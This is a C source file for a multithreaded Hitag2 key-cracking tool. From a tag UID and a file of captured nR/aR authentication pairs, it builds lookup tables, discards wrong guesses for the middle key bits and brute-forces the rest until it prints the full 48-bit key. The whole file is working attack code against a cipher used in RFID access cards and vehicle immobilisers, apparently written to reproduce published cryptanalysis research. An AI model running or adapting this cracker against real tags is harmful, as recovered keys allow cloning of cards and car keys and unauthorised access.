#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <inttypes.h>
#include <string.h>

#include "hitagcrypto.h"
#include "ht2crackutils.h"

// max number of NrAr pairs to load - you only need 136 good pairs, but this
// is the max
#define NUM_NRAR 1024
#define NUM_THREADS 8

// table entry for Tkleft
struct Tklower {
    uint64_t yxorb;
    char notb32;
    uint64_t klowery;
};

// table entry for nR aR pair
struct nRaR {
    uint64_t nR;
    uint64_t aR;
};

// struct to hold data for thread
struct threaddata {
    uint64_t uid;
    struct nRaR *TnRaR;
    unsigned int numnrar;
    uint64_t klowerstart;
    uint64_t klowerrange;
};

// macros to pick out 4 bits in various patterns of 1s & 2s & make a new number
// these and the following hitag2_crypt function taken from Rfidler
#define pickbits2_2(S, A, B)       ( ((S >> A) & 3) | ((S >> (B - 2)) & 0xC) )
#define pickbits1x4(S, A, B, C, D) ( ((S >> A) & 1) | ((S >> (B - 1)) & 2) | \
                                   ((S >> (C - 2)) & 4) | ((S >> (D - 3)) & 8) )
#define pickbits1_1_2(S, A, B, C)  ( ((S >> A) & 1) | ((S >> (B - 1)) & 2) | \
                                   ((S >> (C - 2)) & 0xC) )
#define pickbits2_1_1(S, A, B, C)  ( ((S >> A) & 3) | ((S >> (B - 2)) & 4) | \
                                   ((S >> (C - 3)) & 8) )
#define pickbits1_2_1(S, A, B, C)  ( ((S >> A) & 1) | ((S >> (B - 1)) & 6) | \
                                   ((S >> (C - 3)) & 8) )


static uint32_t hitag2_crypt(uint64_t s) {
    const uint32_t ht2_function4a = 0x2C79; // 0010 1100 0111 1001
    const uint32_t ht2_function4b = 0x6671; // 0110 0110 0111 0001
    const uint32_t ht2_function5c = 0x7907287B; // 0111 1001 0000 0111 0010 1000 0111 1011
    uint32_t bitindex;

    bitindex = (ht2_function4a >> pickbits2_2(s, 1, 4)) & 1;
    bitindex |= ((ht2_function4b << 1) >> pickbits1_1_2(s, 7, 11, 13)) & 0x02;
    bitindex |= ((ht2_function4b << 2) >> pickbits1x4(s, 16, 20, 22, 25)) & 0x04;
    bitindex |= ((ht2_function4b << 3) >> pickbits2_1_1(s, 27, 30, 32)) & 0x08;
    bitindex |= ((ht2_function4a << 4) >> pickbits1_2_1(s, 33, 42, 45)) & 0x10;

    return (ht2_function5c >> bitindex) & 1;
}


// this function is a modification of the filter function f, based heavily
// on the hitag2_crypt function in Rfidler
static int fnP(uint64_t klowery) {
    const uint32_t ht2_function4a = 0x2C79; // 0010 1100 0111 1001
    const uint32_t ht2_function4b = 0x6671; // 0110 0110 0111 0001
    const uint32_t ht2_function4p = 0xAE83; // 1010 1110 1000 0011
    uint32_t i;

    i = (ht2_function4a >> pickbits2_2(klowery, 2, 5)) & 1;
    i |= ((ht2_function4b << 1) >> pickbits1_1_2(klowery, 8, 12, 14)) & 0x02;
    i |= ((ht2_function4b << 2) >> pickbits1x4(klowery, 17, 21, 23, 26)) & 0x04;
    i |= ((ht2_function4b << 3) >> pickbits2_1_1(klowery, 28, 31, 33)) & 0x08;

    // modified to use reference implementation approach
    // orig fc table is 0x7907287B = 0111 1001 0000 0111    0010 1000 0111 1011
    // we ignore the top bit (bit 4) of the parameter, so therefore create a new
    // table that indicates which bit positions are the same if the top bit is 1 or 0
    return (ht2_function4p >> i) & 1;
}

// comparison function for sorting/searching Tklower entries
static int Tk_cmp(const void *v1, const void *v2) {
    const struct Tklower *Tk1 = (struct Tklower *)v1;
    const struct Tklower *Tk2 = (struct Tklower *)v2;

    if (Tk1->yxorb < Tk2->yxorb) {
        return -1;
    } else if (Tk1->yxorb > Tk2->yxorb) {
        return 1;
    }

    return 0;
}

// test for bad guesses of kmiddle
static int is_kmiddle_badguess(uint64_t z, struct Tklower *Tk, int max, int aR0) {

    struct Tklower *result, target;

    // "If there is an entry in Tklower for which y ^ b = z but !b32 != aR[0]
    // then the attacker learns that kmiddle is a bad guess... otherwise, if
    // !b32 == aR[0] then kmiddle is still a viable guess."

    target.yxorb = z;
    target.notb32 = 0;
    result = (struct Tklower *)bsearch(&target, Tk, max, sizeof(struct Tklower), Tk_cmp);

    if (result) {
        if (result->notb32 != aR0) {
            return 1;
        }
    } else {
        return 2;
    }

    return 0;
}

// function to test if a partial key is valid
static int testkey(uint64_t *out, uint64_t uid, uint64_t pkey, uint64_t nR, uint64_t aR) {
    uint64_t kupper;
    Hitag_State hstate;
    uint32_t revaR;
    uint32_t normaR;

    // normalise aR
    revaR = rev32(aR);
    normaR = ((revaR >> 24) | ((revaR >> 8) & 0xff00) | ((revaR << 8) & 0xff0000) | (revaR << 24));

    // search for remaining 14 bits
    for (kupper = 0; kupper < 0x3fff; kupper++) {
        uint64_t key = (kupper << 34) | pkey;
        hitag2_init(&hstate, key, uid, nR);
        uint64_t b = hitag2_nstep(&hstate, 32);
        if ((normaR ^ b) == 0xffffffff) {
            *out = key;
            return 1;
        }
    }
    return 0;
}

// some notes on how I think this attack should work.
// due to the way fc works, in a number of cases, it doesn't matter what
// the most significant bits are doing for it to produce the same result.
// These are the most sig 14 bits to be clear.  Looking at fc it is poss
// to see cases where the most sig bit of the input to fc (which is made
// from fa on 4 of the most sig bits from bit 34 onwards) does not affect
// whether it gives a 0 or 1 as the input 0b0ABCD gives the same bit value
// as input 0b1ABCD.
// The PRNG is initialised by setting the lower 32 bits to the UID, with
// the upper 16 bits set to the lower 16 bits of the key.  Next the 32
// upper bits of the key are XORed with the private nonce and these are
// shifted in, with the PRNG outputting bits b0 to b31.  These bits are
// used to encrypt (XOR with) the nonce to produce nR, which is sent to
// the card.
// (The card should init the PRNG with the same UID and lower 16 bits of
// the key, receive the nR, then shift it in bit by bit while xoring each
// bit with its output, and the key - this essentially decrypts the nR to
// the nonce XOR the upper 32 bits of the key, while shifting it in.
// The card's PRNG will then be in the same state as the RWD.)
// By knowing the UID and guessing the lower 16 bits of the key, and
// focusing on nR values that don't affect the upper bits of fc, we can
// limit our guesses to a smaller set than a full brute force and
// effectively work out candidates for the lower 34 bits of the key.

static void *crack(void *d) {
    struct threaddata *data = (struct threaddata *)d;
    uint64_t uid;
    struct nRaR *TnRaR;
    unsigned int numnrar;

    int i, j;

    uint64_t klower, kmiddle, klowery;
    uint64_t y, b, z, bit;
    uint64_t ytmp;
    uint64_t foundkey, revkey;
    int ret;
    unsigned int found;
    unsigned int badguess;
    struct Tklower *Tk = NULL;

    if (!data) {
        printf("Thread data is NULL\n");
        exit(1);
    }

    uid = data->uid;
    TnRaR = data->TnRaR;
    numnrar = data->numnrar;

    // create space for tables
    Tk = (struct Tklower *)malloc(sizeof(struct Tklower) * 0x40000);
    if (!Tk) {
        printf("Failed to allocate memory (Tk)\n");
        exit(1);
    }

    // find keys
    for (klower = data->klowerstart; klower < (data->klowerstart + data->klowerrange); klower++) {
        printf("trying klower = 0x%05"PRIx64"\n", klower);
        // build table
        unsigned int count = 0;
        for (y = 0; y < 0x40000; y++) {
            // create klowery
            klowery = (y << 16) | klower;
            // check for cases where right most bit of fc doesn't matter

            if (fnP(klowery)) {
                // store klowery
                Tk[count].klowery = klowery;
                // build the initial prng state
                uint64_t shiftreg = (klower << 32) | uid;
                // insert y into shiftreg and extract keystream, reversed order
                b = 0;
                ytmp = y;
                for (j = 0; j < 2; j++) {
                    shiftreg = shiftreg | ((ytmp & 0xffff) << 48);
                    for (i = 0; i < 16; i++) {
                        shiftreg = shiftreg >> 1;
                        bit = hitag2_crypt(shiftreg);
                        b = (b >> 1) | (bit << 31);
                    }
                    ytmp = ytmp >> 16;
                }

                // store the xor of y and b0-17
                Tk[count].yxorb = y ^ (b & 0x3ffff);

                // get and store inverse of next bit from prng
                // don't need to worry about shifting in the new bit because
                // it doesn't affect the filter function anyway
                shiftreg = shiftreg >> 1;
                Tk[count].notb32 = hitag2_crypt(shiftreg) ^ 0x1;

                // increase count
                count++;
            }
        }

        qsort(Tk, count, sizeof(struct Tklower), Tk_cmp);

        // look for matches
        for (kmiddle = 0; kmiddle < 0x40000; kmiddle++) {
            // loop over nRaR pairs
            badguess = 0;
            found = 0;
            for (i = 0; (i < numnrar) && (!badguess); i++) {
                z = kmiddle ^ (TnRaR[i].nR & 0x3ffff);
                ret = is_kmiddle_badguess(z, Tk, count, TnRaR[i].aR & 0x1);
                if (ret == 1) {
                    badguess = 1;
                } else if (ret == 0) {
                    found++;
                }
            }

            if ((found) && (!badguess)) {
                // brute
                printf("possible partial key found: 0x%012"PRIx64"\n", ((uint64_t)kmiddle << 16) | klower);

                if (testkey(&foundkey, uid, (kmiddle << 16 | klower), TnRaR[0].nR, TnRaR[0].aR) &&
                        testkey(&foundkey, uid, (kmiddle << 16 | klower), TnRaR[1].nR, TnRaR[1].aR)) {
                    // normalise foundkey
                    revkey = rev64(foundkey);
                    foundkey = ((revkey >> 40) & 0xff) | ((revkey >> 24) & 0xff00) | ((revkey >> 8) & 0xff0000) | ((revkey << 8) & 0xff000000) | ((revkey << 24) & 0xff00000000) | ((revkey << 40) & 0xff0000000000);
                    printf("\n\nSuccess - key = %012"PRIx64"\n", foundkey);
                    exit(0);

                    return (void *)foundkey;
                }

            }

        }
    }

    free(Tk);
    return NULL;
}
int main(int argc, char *argv[]) {
    FILE *fp;
    int i;
    pthread_t threads[NUM_THREADS];
    void *status;

    uint64_t uid;
    uint64_t klowerstart;
    unsigned int numnrar = 0;
    char *buf = NULL;
    char *buft1 = NULL;
    char *buft2 = NULL;
    size_t lenbuf = 64;

    struct nRaR *TnRaR = NULL;
    struct threaddata *tdata = NULL;

    if (argc < 3) {
        printf("%s uid nRaRfile\n", argv[0]);
        exit(1);
    }

    // read the UID into internal format
    if (!strncmp(argv[1], "0x", 2)) {
        uid = rev32(hexreversetoulong(argv[1] + 2));
    } else {
        uid = rev32(hexreversetoulong(argv[1]));
    }

    // create table of nR aR pairs
    TnRaR = (struct nRaR *)malloc(sizeof(struct nRaR) * NUM_NRAR);

    // open file
    fp = fopen(argv[2], "r");
    if (!fp) {
        printf("cannot open nRaRfile\n");
        exit(1);
    }

    // set klowerstart (for debugging)
    if (argc > 3) {
        klowerstart = strtol(argv[3], NULL, 0);
    } else {
        klowerstart = 0;
    }

    // read in nR aR pairs
    numnrar = 0;
    buf = (char *)calloc(1, lenbuf);
    if (!buf) {
        printf("cannot calloc buf\n");
        exit(1);
    }

    while (getline(&buf, &lenbuf, fp) > 0) {
        buft1 = strchr(buf, ' ');
        if (!buft1) {
            printf("invalid file input on line %u\n", numnrar + 1);
            exit(1);
        }
        *buft1 = 0x00;
        buft1++;
        buft2 = strchr(buft1, '\n');
        if (!buft2) {
            printf("no CR on line %u\n", numnrar + 1);
            exit(1);
        }
        *buft2 = 0x00;
        if (!strncmp(buf, "0x", 2)) {
            TnRaR[numnrar].nR = rev32(hexreversetoulong(buf + 2));
            TnRaR[numnrar].aR = rev32(hexreversetoulong(buft1 + 2));
        } else {
            TnRaR[numnrar].nR = rev32(hexreversetoulong(buf));
            TnRaR[numnrar].aR = rev32(hexreversetoulong(buft1));
        }
        numnrar++;
    }

    // close file
    fclose(fp);

    printf("Loaded %u NrAr pairs\n", numnrar);

    // create table of thread data
    tdata = (struct threaddata *)calloc(1, sizeof(struct threaddata) * NUM_THREADS);
    if (!tdata) {
        printf("cannot calloc threaddata\n");
        exit(1);
    }

    for (i = 0; i < NUM_THREADS; i++) {
        tdata[i].uid = uid;
        tdata[i].TnRaR = TnRaR;
        tdata[i].numnrar = numnrar;
        tdata[i].klowerrange = 0x10000 / NUM_THREADS;
        tdata[i].klowerstart = i * tdata[i].klowerrange;
    }

    if (klowerstart) {
        // debug mode only runs one thread from klowerstart
        tdata[0].klowerstart = klowerstart;
        crack(tdata);
    } else {
        // run full threaded mode
        for (i = 0; i < NUM_THREADS; i++) {
            if (pthread_create(&(threads[i]), NULL, crack, (void *)(tdata + i))) {
                printf("cannot start thread %d\n", i);
                exit(1);
            }
        }
    }

    // wait for threads to finish
    for (i = 0; i < NUM_THREADS; i++) {
        if (pthread_join(threads[i], &status)) {
            printf("cannot join thread %d\n", i);
            exit(1);
        }
        printf("thread %i finished\n", i);
        if (status) {
            printf("Key = %012"PRIx64"\n", (uint64_t)status);
            exit(0);
        }
    }

    printf("Did not find key :(\n");
    pthread_exit(NULL);

    return 0;
}

